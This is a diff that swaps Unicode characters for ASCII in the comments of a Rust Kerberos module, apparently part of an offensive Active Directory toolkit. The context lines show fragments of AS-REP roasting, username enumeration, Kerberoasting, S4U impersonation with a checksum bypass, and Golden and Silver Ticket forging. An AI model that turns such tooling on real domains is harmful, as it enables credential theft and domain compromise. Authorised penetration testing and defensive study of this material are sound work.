@@ -20,9 +20,9 @@ use tokio::io::{AsyncReadExt, AsyncWriteExt};
 use tokio::net::{TcpStream, UdpSocket};
 use tracing::{debug, info, warn};
 
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 //  Constants
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 pub const KDC_PORT: u16 = 88;
 
 /// Normalize username by stripping @domain suffix if present.
@@ -60,7 +60,7 @@ pub const PA_TGS_REQ: i32 = 1;
 pub const PA_PAC_REQUEST: i32 = 128;
 pub const PA_FOR_USER: i32 = 129;
 pub const PA_PAC_OPTIONS: i32 = 167;
-/// PA-FX-FAST (RFC 6806) — Kerberos armoring
+/// PA-FX-FAST (RFC 6806) -- Kerberos armoring
 pub const PA_FX_FAST: i32 = 136;
 /// FX-FAST armored padata wrapper
 pub const PA_FX_FAST_ARMORED: i32 = 137;
@@ -74,9 +74,9 @@ pub const KDC_OPT_RENEWABLE_OK: u32 = 0x00000010;
 pub const KDC_OPT_CANONICALIZE: u32 = 0x00010000;
 pub const KDC_OPT_CNAME_IN_ADDL_TKT: u32 = 0x00004000;
 
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 //  Public Types
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 
 /// Supported Kerberos encryption types
 #[derive(Debug, Clone, Copy, PartialEq)]
@@ -155,9 +155,9 @@ impl std::fmt::Display for CrackableHash {
     }
 }
 
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 //  KDC TCP Transport
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 
 /// Send a Kerberos message over TCP (4-byte BE length prefix + payload)
 async fn kdc_send(stream: &mut TcpStream, data: &[u8]) -> Result<()> {
@@ -241,9 +241,9 @@ async fn kdc_exchange_tcp(dc_ip: &str, request_bytes: &[u8]) -> Result<Vec<u8>> 
         .map_err(|_| OverthroneError::Kerberos(format!("KDC no response: {addr}")))?
 }
 
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 //  Message Builders
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 
 /// Build KDC-REQ-BODY for an AS-REQ
 fn build_as_req_body(username: &str, realm: &str, etypes: &[i32]) -> KdcReqBody {
@@ -556,7 +556,7 @@ fn parse_krb_error(data: &[u8]) -> OverthroneError {
 
             // For WRONG_REALM, extract realm hints from the KRB-ERROR response
             if code == 68 {
-                // KDC_ERR_WRONG_REALM — the KDC often includes the correct realm
+                // KDC_ERR_WRONG_REALM -- the KDC often includes the correct realm
                 let suggested_realm =
                     krb_err.crealm.as_ref().map(|r| r.to_string()).or_else(|| {
                         // Fall back to the service realm from the error
@@ -621,9 +621,9 @@ async fn resolve_realm_kdc(realm: &str, fallback_dc_ip: Option<&str>) -> Result<
     }
 }
 
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 //  AS-REP Roasting (no pre-auth required)
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 
 /// Perform AS-REP Roasting against a user with DONT_REQ_PREAUTH.
 /// Returns a hashcat-mode-18200 compatible hash string.
@@ -649,7 +649,7 @@ pub async fn asrep_roast_with_etypes(
     let clean_username = normalize_username(username);
     info!("AS-REP Roasting: {clean_username}@{realm} via {dc_ip} (etypes: {etypes:?})");
 
-    // AS-REQ WITHOUT pre-auth — request multiple etypes to capture AES hashes
+    // AS-REQ WITHOUT pre-auth -- request multiple etypes to capture AES hashes
     let req_body = build_as_req_body(clean_username, &realm, etypes);
 
     let as_req = AsReq {
@@ -686,16 +686,16 @@ pub async fn asrep_roast_with_etypes(
     }
 }
 
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 //  Kerberos Username Enumeration (Zero-Knowledge)
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 
 /// Result of a single username enumeration probe
 #[derive(Debug, Clone, PartialEq)]
 pub enum UserEnumStatus {
     /// User exists and requires pre-authentication (KDC_ERR_PREAUTH_REQUIRED)
     Valid,
-    /// User exists and does NOT require pre-auth — AS-REP hash captured
+    /// User exists and does NOT require pre-auth -- AS-REP hash captured
     ValidNoPreauth(CrackableHash),
     /// User exists but account is disabled/revoked (KDC_ERR_CLIENT_REVOKED)
     Disabled,
@@ -707,10 +707,10 @@ pub enum UserEnumStatus {
 
 /// Probe whether a username exists via Kerberos AS-REQ (no credentials needed).
 /// Sends an AS-REQ without PA-ENC-TIMESTAMP. The KDC error code reveals:
-/// - `KDC_ERR_C_PRINCIPAL_UNKNOWN` (6)  → user does NOT exist
-/// - `KDC_ERR_PREAUTH_REQUIRED` (25)    → user EXISTS (needs pre-auth)
-/// - `KDC_ERR_CLIENT_REVOKED` (18)      → user EXISTS but disabled
-/// - Full AS-REP response               → user EXISTS + no pre-auth (hash captured)
+/// - `KDC_ERR_C_PRINCIPAL_UNKNOWN` (6)  -> user does NOT exist
+/// - `KDC_ERR_PREAUTH_REQUIRED` (25)    -> user EXISTS (needs pre-auth)
+/// - `KDC_ERR_CLIENT_REVOKED` (18)      -> user EXISTS but disabled
+/// - Full AS-REP response               -> user EXISTS + no pre-auth (hash captured)
 pub async fn user_enum_single(dc_ip: &str, domain: &str, username: &str) -> UserEnumStatus {
     let realm = normalize_realm(domain);
     let clean_username = normalize_username(username);
@@ -741,7 +741,7 @@ fn parse_user_enum_response(
     clean_username: String,
     domain: &str,
 ) -> UserEnumStatus {
-    // If we get a valid AS-REP, the user exists AND has no pre-auth — jackpot
+    // If we get a valid AS-REP, the user exists AND has no pre-auth -- jackpot
     if let Ok((_, as_rep)) = AsRep::parse(response_bytes) {
         let enc_part = &as_rep.enc_part;
         let cipher_data = &enc_part.cipher;
@@ -772,7 +772,7 @@ fn parse_user_enum_response(
     }
 }
 
-/// Batch user enumeration — opens one TCP connection and reuses it for all requests.
+/// Batch user enumeration -- opens one TCP connection and reuses it for all requests.
 /// Much faster than opening a new TCP connection per user.
 pub async fn user_enum_batch(
     dc_ip: &str,
@@ -880,7 +880,7 @@ pub async fn user_enum_batch(
                     parse_user_enum_response(&bytes, clean_username.to_string(), domain)
                 }
                 _ => {
-                    // Timeout or read error — connection state is lost.
+                    // Timeout or read error -- connection state is lost.
                     // Reconnect a fresh stream for the next user.
                     *stream_guard = match tokio::time::timeout(
                         tokio::time::Duration::from_secs(5),
@@ -912,9 +912,9 @@ pub async fn user_enum_batch(
     results
 }
 
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 //  TGT Request (with pre-authentication)
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 
 /// Request a TGT via AS-REQ with PA-ENC-TIMESTAMP pre-auth.
 /// `secret` is either a password or NT hash (set `use_hash=true`).
@@ -1059,13 +1059,13 @@ pub async fn request_tgt(
                             }
                         }
                     }
-                    // Not a referral — save error and try next etype
+                    // Not a referral -- save error and try next etype
                     last_error = Some(parse_krb_error(&response_bytes));
                     continue;
                 }
             }
         }
-        // All etypes tried for this DC — stop trying
+        // All etypes tried for this DC -- stop trying
         break;
     }
 
@@ -1095,7 +1095,7 @@ pub struct RequestTgtOptions {
 /// When `aes_only` is true:
 /// - Requests etype 18 as the preferred encryption type
 /// - Falls back to etype 17 (AES128) then 23 (RC4) if AES256 is unsupported
-/// - Uses the password → AES key derivation instead of NT hash → RC4
+/// - Uses the password -> AES key derivation instead of NT hash -> RC4
 ///
 /// When `aes_only` is false, behaves identically to `request_tgt`.
 pub async fn request_tgt_opsec(
@@ -1246,9 +1246,9 @@ pub async fn request_tgt_opsec(
     ))
 }
 
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 //  Kerberoasting (TGS-REQ for target SPN)
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 
 /// Request a service ticket for an SPN and extract the crackable hash.
 /// Requires a valid TGT from `request_tgt()`.
@@ -1746,9 +1746,9 @@ pub async fn request_service_ticket_fast(
     ))
 }
 
-// ═══════════════════════════════════════════════════════════
-//  S4U2Self — Impersonate any user to ourselves
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
+//  S4U2Self -- Impersonate any user to ourselves
+// ===========================================================
 
 /// S4U2Self: Request a service ticket on behalf of another user.
 /// Used in constrained delegation attacks.
@@ -2015,7 +2015,7 @@ pub async fn s4u2self_with_checksum_bypass(
                         }
                     }
                 }
-                // KDC rejected the modified request — bypass technique failed
+                // KDC rejected the modified request -- bypass technique failed
                 return Err(parse_krb_error(&response_bytes));
             }
         }
@@ -2025,8 +2025,8 @@ pub async fn s4u2self_with_checksum_bypass(
         "S4U2Self-bypass: referral loop exhausted".to_string(),
     ))
 }
-//  S4U2Proxy — Forward to target service
-// ═══════════════════════════════════════════════════════════
+//  S4U2Proxy -- Forward to target service
+// ===========================================================
 
 /// S4U2Proxy: Use an S4U2Self ticket to get a ticket for a target service SPN.
 /// Supports cross-domain referral: when the KDC responds with `KDC_ERR_WRONG_REALM`,
@@ -2285,9 +2285,9 @@ pub async fn request_service_ticket_ex(
     }
 }
 
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 //  Helpers
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 
 /// Build HMAC-MD5 checksum for S4U2Self PA-FOR-USER
 pub fn build_s4u2self_checksum(
@@ -2337,9 +2337,9 @@ pub fn krb_error_to_string(code: i32) -> &'static str {
         _ => "UNKNOWN_ERROR",
     }
 }
-// ═══════════════════════════════════════════════════════════
-// Ticket Forging — Golden & Silver Tickets
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
+// Ticket Forging -- Golden & Silver Tickets
+// ===========================================================
 
 /// Forge a TGT (Golden Ticket) using the krbtgt NTLM hash.
 /// This creates a valid TGT without contacting the KDC by encrypting
@@ -2449,7 +2449,7 @@ pub fn forge_service_ticket(
 ) -> Result<TicketGrantingData> {
     let realm = domain.to_uppercase();
     info!(
-        "Forging Silver Ticket: {}@{} → {} (etype={})",
+        "Forging Silver Ticket: {}@{} -> {} (etype={})",
         username, realm, spn, etype
     );
 
@@ -2498,7 +2498,7 @@ pub fn forge_service_ticket(
     };
 
     info!(
-        "Silver Ticket forged: {} → {} ({} bytes)",
+        "Silver Ticket forged: {} -> {} ({} bytes)",
         username,
         spn,
         ticket.build().len()
@@ -2514,9 +2514,9 @@ pub fn forge_service_ticket(
     })
 }
 
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 // Ticket Forging Internals
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 
 /// Generate a random session key of appropriate length for the etype
 fn generate_session_key(etype: i32) -> Vec<u8> {
@@ -2560,11 +2560,11 @@ fn build_enc_ticket_part(
 ) -> Vec<u8> {
     let mut inner = Vec::new();
 
-    // [0] flags — FORWARDABLE | RENEWABLE | PRE_AUTHENT | INITIAL
+    // [0] flags -- FORWARDABLE | RENEWABLE | PRE_AUTHENT | INITIAL
     let flags: u32 = 0x40800010; // forwardable(1) | renewable(8) | initial(24) | pre-authent(25)
     inner.extend_from_slice(&asn1_context_tag(0, &asn1_bitstring_u32(flags)));
 
-    // [1] key — EncryptionKey { keytype, keyvalue }
+    // [1] key -- EncryptionKey { keytype, keyvalue }
     let enc_key = asn1_sequence(&[
         &asn1_context_tag(0, &asn1_integer(etype as i64)),
         &asn1_context_tag(1, &asn1_octet_string(session_key)),
@@ -2574,14 +2574,14 @@ fn build_enc_ticket_part(
     // [2] crealm
     inner.extend_from_slice(&asn1_context_tag(2, &asn1_general_string(realm)));
 
-    // [3] cname — PrincipalName { name-type, name-string }
+    // [3] cname -- PrincipalName { name-type, name-string }
     let cname = asn1_sequence(&[
         &asn1_context_tag(0, &asn1_integer(NT_PRINCIPAL as i64)),
         &asn1_context_tag(1, &asn1_sequence_of_general_strings(&[username])),
     ]);
     inner.extend_from_slice(&asn1_context_tag(3, &cname));
 
-    // [4] transited — TransitedEncoding { tr-type=0, contents="" }
+    // [4] transited -- TransitedEncoding { tr-type=0, contents="" }
     let transited = asn1_sequence(&[
         &asn1_context_tag(0, &asn1_integer(0)),
         &asn1_context_tag(1, &asn1_octet_string(&[])),
@@ -2603,7 +2603,7 @@ fn build_enc_ticket_part(
     let renew_str = format_kerberos_time(renew_till);
     inner.extend_from_slice(&asn1_context_tag(8, &asn1_generalized_time(&renew_str)));
 
-    // [10] authorization-data — wraps the PAC
+    // [10] authorization-data -- wraps the PAC
     // AuthorizationData ::= SEQUENCE OF { ad-type[0] INTEGER, ad-data[1] OCTET STRING }
     // AD-IF-RELEVANT(1) wrapping AD-WIN2K-PAC(128)
     if !pac.is_empty() {
@@ -2693,7 +2693,7 @@ fn build_kerb_validation_info(
     buf.extend_from_slice(&0x00020000u32.to_le_bytes());
 
     // KERB_VALIDATION_INFO fields (simplified NDR encoding)
-    // LogonTime (FILETIME) — current time as Windows FILETIME
+    // LogonTime (FILETIME) -- current time as Windows FILETIME
     let filetime = chrono_to_filetime(&Utc::now());
     buf.extend_from_slice(&filetime.to_le_bytes()); // LogonTime
     buf.extend_from_slice(&0u64.to_le_bytes()); // LogoffTime (never)
@@ -2702,7 +2702,7 @@ fn build_kerb_validation_info(
     buf.extend_from_slice(&0u64.to_le_bytes()); // PasswordCanChange
     buf.extend_from_slice(&0x7FFFFFFFFFFFFFFFu64.to_le_bytes()); // PasswordMustChange (never)
 
-    // EffectiveName (RPC_UNICODE_STRING) — pointer, will be deferred
+    // EffectiveName (RPC_UNICODE_STRING) -- pointer, will be deferred
     let username_utf16: Vec<u8> = username
         .encode_utf16()
         .flat_map(|c| c.to_le_bytes())
@@ -2712,7 +2712,7 @@ fn build_kerb_validation_info(
     buf.extend_from_slice(&username_byte_len.to_le_bytes()); // MaximumLength
     buf.extend_from_slice(&0x00040000u32.to_le_bytes()); // Pointer (deferred)
 
-    // FullName (RPC_UNICODE_STRING) — same as username for simplicity
+    // FullName (RPC_UNICODE_STRING) -- same as username for simplicity
     buf.extend_from_slice(&username_byte_len.to_le_bytes());
     buf.extend_from_slice(&username_byte_len.to_le_bytes());
     buf.extend_from_slice(&0x00080000u32.to_le_bytes());
@@ -2803,9 +2803,9 @@ fn build_kerb_validation_info(
     buf.extend_from_slice(&0u32.to_le_bytes());
     buf.extend_from_slice(&0u32.to_le_bytes());
 
-    // ═══════════════════════════════════════════
+    // ===========================================
     // Deferred pointers (conformant data)
-    // ═══════════════════════════════════════════
+    // ===========================================
 
     // EffectiveName string data
     ndr_write_conformant_string(&mut buf, &username_utf16);
@@ -2930,9 +2930,9 @@ fn chrono_to_filetime(dt: &chrono::DateTime<Utc>) -> u64 {
     unix_100ns + EPOCH_DIFF
 }
 
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 // ASN.1 DER Encoding Helpers (for manual EncTicketPart construction)
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
 
 /// Encode DER length
 fn asn1_length(len: usize) -> Vec<u8> {
@@ -3099,9 +3099,9 @@ fn hex_encode(data: &[u8]) -> String {
     data.iter().map(|b| format!("{:02x}", b)).collect()
 }
 
-// ═══════════════════════════════════════════════════════════
-//  FAST Armor (RFC 6806) — Kerberos Armoring
-// ═══════════════════════════════════════════════════════════
+// ===========================================================
+//  FAST Armor (RFC 6806) -- Kerberos Armoring
+// ===========================================================
 
 /// Parameters for FAST armor construction.
 #[derive(Debug, Clone)]
@@ -3127,7 +3127,7 @@ pub fn build_fast_armor(params: &FastArmorParams) -> Result<Vec<u8>> {
     // the armor ticket. The KDC verifies this AP-REQ to establish trust
     // before processing the inner request.
 
-    // ── Step 1: Build AP-REQ with TGT as armor ──────────────────
+    // -- Step 1: Build AP-REQ with TGT as armor ------------------
     // AP-REQ ::= SEQUENCE {
     //     pvno         [0] INTEGER (5),
     //     msg-type     [1] INTEGER (14),
@@ -3184,7 +3184,7 @@ pub fn build_fast_armor(params: &FastArmorParams) -> Result<Vec<u8>> {
 
     let ap_req = asn1_sequence(&[&pvno, &msg_type, &ap_options, &ticket, &authenticator]);
 
-    // ── Step 2: Build KrbFastArmor ──────────────────────────────
+    // -- Step 2: Build KrbFastArmor ------------------------------
     // KrbFastArmor ::= SEQUENCE {
     //     armor-type  [0] Int32 (1 = KRB_ARMOR_TGT),
     //     armor-value [1] OCTET STRING (AP-REQ DER)
@@ -3193,7 +3193,7 @@ pub fn build_fast_armor(params: &FastArmorParams) -> Result<Vec<u8>> {
     let armor_value = asn1_implicit_primitive(1, &ap_req);
     let fast_armor = asn1_sequence(&[&armor_type, &armor_value]);
 
-    // ── Step 3: Build KrbFastEncPart ────────────────────────────
+    // -- Step 3: Build KrbFastEncPart ----------------------------
     // KrbFastEncPart ::= SEQUENCE {
     //     enc-body [0] OCTET STRING (KDC-REQ body DER),
     //     nonce    [1] UInt32
@@ -3203,7 +3203,7 @@ pub fn build_fast_armor(params: &FastArmorParams) -> Result<Vec<u8>> {
     let nonce_der = asn1_implicit_primitive(1, &asn1_integer(nonce as i64));
     let fast_enc_part = asn1_sequence(&[&enc_body, &nonce_der]);
 
-    // ── Step 4: Encrypt KrbFastEncPart with armor key ───────────
+    // -- Step 4: Encrypt KrbFastEncPart with armor key -----------
     // Per RFC 6806 §5.4.1: armor key = TGT session key directly.
     // Key usage 10 = PA-FX-FAST enc-part encryption.
     let encrypted_enc_part = cipher.encrypt(params.tgt_session_key, 10, &fast_enc_part);
@@ -3213,7 +3213,7 @@ pub fn build_fast_armor(params: &FastArmorParams) -> Result<Vec<u8>> {
     let enc_part_cipher = asn1_context_tag(2, &encrypted_enc_part);
     let enc_part_encrypted_data = asn1_sequence(&[&enc_part_etype, &enc_part_cipher]);
 
-    // ── Step 5: Build KrbFastRequest ────────────────────────────
+    // -- Step 5: Build KrbFastRequest ----------------------------
     // KrbFastRequest ::= SEQUENCE {
     //     armor    [0] KrbFastArmor OPTIONAL,
     //     enc-part [2] EncryptedData
@@ -3222,7 +3222,7 @@ pub fn build_fast_armor(params: &FastArmorParams) -> Result<Vec<u8>> {
     let enc_part_field = asn1_implicit_constructed(2, &enc_part_encrypted_data);
     let fast_request = asn1_sequence(&[&armor_field, &enc_part_field]);
 
-    // ── Step 6: Wrap in PA-DATA (type = 136 = PA_FX_FAST) ─────
+    // -- Step 6: Wrap in PA-DATA (type = 136 = PA_FX_FAST) -----
     // PA-DATA ::= SEQUENCE {
     //     padata-type  [1] INTEGER,
     //     padata-value [2] OCTET STRING
@@ -3359,7 +3359,7 @@ mod tests {
     use super::*;
     use chrono::{TimeZone, Utc};
 
-    // ─── normalize_username / normalize_realm ────────────────
+    // --- normalize_username / normalize_realm ----------------
 
     #[test]
     fn test_normalize_username_plain() {
@@ -3382,7 +3382,7 @@ mod tests {
         assert_eq!(normalize_realm("CORP.LOCAL"), "CORP.LOCAL");
     }
 
-    // ─── KRB-ERROR codes ────────────────────────────────────
+    // --- KRB-ERROR codes ------------------------------------
 
     #[test]
     fn test_krb_error_to_string_known_codes() {
@@ -3413,11 +3413,11 @@ mod tests {
         assert_eq!(krb_error_to_string(0xff), "UNKNOWN_ERROR");
     }
 
-    // ─── ASN.1 DER helpers ──────────────────────────────────
+    // --- ASN.1 DER helpers ----------------------------------
 
     #[test]
     fn test_asn1_length_short() {
-        // Length < 128 → single byte
+        // Length < 128 -> single byte
         assert_eq!(asn1_length(0), vec![0x00]);
         assert_eq!(asn1_length(1), vec![0x01]);
         assert_eq!(asn1_length(0x7f), vec![0x7f]);
@@ -3425,7 +3425,7 @@ mod tests {
 
     #[test]
     fn test_asn1_length_long() {
-        // Length ≥ 128 → multi-byte: high bit set + number of length bytes
+        // Length ≥ 128 -> multi-byte: high bit set + number of length bytes
         let result = asn1_length(0x80);
         assert_eq!(result.len(), 2);
         assert_eq!(result[0], 0x81);
@@ -3435,7 +3435,7 @@ mod tests {
     #[test]
     fn test_asn1_length_255() {
         let result = asn1_length(255);
-        // 255 < 256 → single length byte: high-bit + value
+        // 255 < 256 -> single length byte: high-bit + value
         assert_eq!(result[0], 0x81);
         assert_eq!(result[1], 0xff);
     }
@@ -3443,7 +3443,7 @@ mod tests {
     #[test]
     fn test_asn1_length_65535() {
         let result = asn1_length(65535);
-        // 65535 >= 256 → two length bytes
+        // 65535 >= 256 -> two length bytes
         assert_eq!(result[0], 0x82);
         assert_eq!(result[1], 0xff);
         assert_eq!(result[2], 0xff);
@@ -3465,14 +3465,14 @@ mod tests {
     #[test]
     fn test_asn1_integer_127() {
         let der = asn1_integer(127);
-        // Should NOT have a leading zero — 127 fits in one byte MSB=0
+        // Should NOT have a leading zero -- 127 fits in one byte MSB=0
         assert_eq!(der, vec![0x02, 0x01, 0x7f]);
     }
 
     #[test]
     fn test_asn1_integer_128() {
         let der = asn1_integer(128);
-        // 128 = 0x80 — needs leading zero to not be sign-extended
+        // 128 = 0x80 -- needs leading zero to not be sign-extended
         assert_eq!(der, vec![0x02, 0x02, 0x00, 0x80]);
     }
 
@@ -3584,7 +3584,7 @@ mod tests {
         assert_eq!(raw[0], 0x30);
     }
 
-    // ─── Hashcat format strings ──────────────────────────────
+    // --- Hashcat format strings ------------------------------
 
     #[test]
     fn test_hashcat_checksum_len_known() {
@@ -3617,14 +3617,14 @@ mod tests {
         );
         // Format: $krb5tgs$23$*admin$CORP.LOCAL$HTTP/server.corp.local$*cd...cd$
         assert!(hash.starts_with("$krb5tgs$23$*admin$CORP.LOCAL$HTTP/server.corp.local"));
-        // cipher is 16 bytes → checksum = 16 bytes (32 hex chars), edata2 empty
+        // cipher is 16 bytes -> checksum = 16 bytes (32 hex chars), edata2 empty
         // hash ends with the 32-char hex checksum and a trailing $
         let hex_checksum = "cdcdcdcdcdcdcdcdcdcdcdcdcdcdcdcd";
         assert!(hash.contains(hex_checksum));
         assert!(hash.ends_with("$"));
     }
 
-    // ─── SID parsing ─────────────────────────────────────────
+    // --- SID parsing -----------------------------------------
 
     #[test]
     fn test_validate_sid_format_valid() {
@@ -3648,16 +3648,16 @@ mod tests {
         let sid_bytes = parse_sid_to_bytes("S-1-5-21-3623811015-3361044348-30300820-500");
         assert_eq!(sid_bytes[0], 1); // revision
         assert_eq!(sid_bytes[1], 5); // subAuthorityCount
-        // IdentifierAuthority: 5 (NT Authority) → big-endian 0x00 0x00 0x00 0x00 0x00 0x05
+        // IdentifierAuthority: 5 (NT Authority) -> big-endian 0x00 0x00 0x00 0x00 0x00 0x05
         assert_eq!(&sid_bytes[2..8], &[0x00, 0x00, 0x00, 0x00, 0x00, 0x05]);
-        // subAuthority[0] = 21 → 0x15 0x00 0x00 0x00 (little-endian)
+        // subAuthority[0] = 21 -> 0x15 0x00 0x00 0x00 (little-endian)
         assert_eq!(sid_bytes[8], 0x15);
         assert_eq!(sid_bytes[9], 0x00);
     }
 
     #[test]
     fn test_parse_sid_to_bytes_rid_extraction() {
-        // S-1-5-21-100-200-300-512 → 5 components, RID=512
+        // S-1-5-21-100-200-300-512 -> 5 components, RID=512
         let sid_bytes = parse_sid_to_bytes("S-1-5-21-100-200-300-512");
         // Last 4 bytes (little-endian) = RID
         let rid_bytes = &sid_bytes[sid_bytes.len() - 4..];
@@ -3665,7 +3665,7 @@ mod tests {
         assert_eq!(rid, 512);
     }
 
-    // ─── Time conversion ─────────────────────────────────────
+    // --- Time conversion -------------------------------------
 
     #[test]
     fn test_chrono_to_filetime_unix_epoch() {
@@ -3696,7 +3696,7 @@ mod tests {
         assert_eq!(format_kerberos_time(&dt), "20250615143000Z");
     }
 
-    // ─── KDC flags ──────────────────────────────────────────
+    // --- KDC flags ------------------------------------------
 
     #[test]
     fn test_kdc_flags_forwardable() {
@@ -3712,7 +3712,7 @@ mod tests {
         assert_eq!(flags.flags, 0u32);
     }
 
-    // ─── Session key generation ──────────────────────────────
+    // --- Session key generation ------------------------------
 
     #[test]
     fn test_generate_session_key_rc4() {
@@ -3732,7 +3732,7 @@ mod tests {
         assert_eq!(key.len(), 32); // AES256 key = 32 bytes
     }
 
-    // ─── PA-ENC-TIMESTAMP (real crypto, offline) ─────────────
+    // --- PA-ENC-TIMESTAMP (real crypto, offline) -------------
 
     #[test]
     fn test_build_pa_enc_timestamp_produces_valid_padata() {
@@ -3748,13 +3748,13 @@ mod tests {
 
     #[test]
     fn test_build_pa_enc_timestamp_aes256() {
-        let key = vec![0xABu8; 32]; // AES256 key — 32 bytes
+        let key = vec![0xABu8; 32]; // AES256 key -- 32 bytes
         let pa_data = build_pa_enc_timestamp(&key, 18).unwrap();
         assert_eq!(pa_data.padata_type, 2);
         assert!(!pa_data.padata_value.is_empty());
     }
 
-    // ─── PAC construction ────────────────────────────────────
+    // --- PAC construction ------------------------------------
 
     #[test]
     fn test_build_minimal_pac_produces_valid_structure() {
@@ -3789,7 +3789,7 @@ mod tests {
         assert_eq!(offset, 24, "LOGON_INFO data should start at offset 24");
     }
 
-    // ─── NDR encoding ────────────────────────────────────────
+    // --- NDR encoding ----------------------------------------
 
     #[test]
     fn test_ndr_write_conformant_string() {
@@ -3810,7 +3810,7 @@ mod tests {
         assert_eq!(max_count, input.len() as u32);
     }
 
-    // ─── Golden ticket forge ─────────────────────────────────
+    // --- Golden ticket forge ---------------------------------
 
     #[test]
     fn test_forge_tgt_produces_valid_kirbi() {
@@ -3830,7 +3830,7 @@ mod tests {
         );
     }
 
-    // ─── Helper: hex_encode ──────────────────────────────────
+    // --- Helper: hex_encode ----------------------------------
 
     #[test]
     fn test_hex_encode_empty() {
